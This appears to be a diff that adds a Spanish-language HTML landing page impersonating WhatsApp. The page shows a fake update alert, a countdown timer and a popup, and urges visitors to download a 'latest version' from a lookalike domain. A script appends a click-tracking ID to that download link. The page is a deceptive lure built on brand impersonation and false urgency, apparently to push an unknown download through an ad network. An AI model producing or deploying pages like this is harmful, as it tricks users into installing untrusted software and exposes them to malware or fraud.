@@ -1,0 +1,59 @@
+<html xmlns="http://www.w3.org/1999/xhtml" class=" clickberry-extension clickberry-extension-standalone><head><meta http equiv="content-type" content="text/html; charset=UTF-8">
+
+<title>whatsapp|whatsapp download|whatsapp download|whatsapp gratis|whatsapp gratis|whatsapp messenger|[whatsapp]|"whatsapp"</title>
+<link href="styles css.css" rel="stylesheet" type="text/css">
+<meta name="viewport" content="width=device-width, user-scalable=false; initial-scale=1.0; maximum-scale=1.0">
+<script language="JavaScript" type="text/javascript">
+    var count=30;
+    var counter=setInterval(timer, 1000); //1000 will  run it every 1 second
+    
+    function timer(){
+      count=count-1;
+      
+      if (count <= 0){
+        clearInterval(counter);
+        return;
+      }
+      document.getElementById("timer").innerHTML=count + " segundos"; // watch for spelling
+    }
+
+    // THIS is what to change
+    function bodyOnload() {
+      var params = window.location.search.substring(1).split("&");
+      var p = params[params.length - 1].split("=");
+      var clickID = p[p.length - 1];
+
+      document.getElementById("aToChange").href = "http://whatsapp.whatsapp-85.com/aabbf508bca693557ddb254681cb7c185fd5f9a9/?s4=" + clickID;
+    }
+
+</script>
+<meta content="clickberry-extension-here"><script id="clickberry-standalone-script" src="chrome-extension://lfmhcpmkbdkbgbmkjoiopeeegenkdikp/modules/clickberry/ChromeStdInjector.js?v=prod&addonType=fvd"></script></head>
+
+<body onload="bodyOnload();" >
+	 
+	<div class="wrap">
+    
+    	<div class="logo">
+    		<img src="http://s3.amazonaws.com/adwill-landers/647/logo2.png" alt="logo" style="width:100%;">
+        </div>
+        
+    	<h3>Alerta para el usuario de Whatsapp</h3>
+    	<p>¡Nuevos fondos de pantalla para WhatsApp y otros contenidos!</p>
+    	<p id="timer" style="margin-bottom: 0!important;font-size: 20px!important;">26 segundos</p>
+        
+        <p style="padding:0 !important; font-size: 20px!important;">Descarga esta última versión para continuar con el servicio.
+</p>
+        
+      <a id="aToChange" href="http://whatsapp.whatsapp-85.com/aabbf508bca693557ddb254681cb7c185fd5f9a9/?s4=ADWILLHTMLCLICKID">
+        <div class="button">
+        	¡Descargar ahora!
+        </div>
+      </a>
+        
+    </div>
+	
+    <script language="javascript" type="text/javascript">
+        alert("Actualización para WhatsApp");
+    </script>
+
+</body></html>
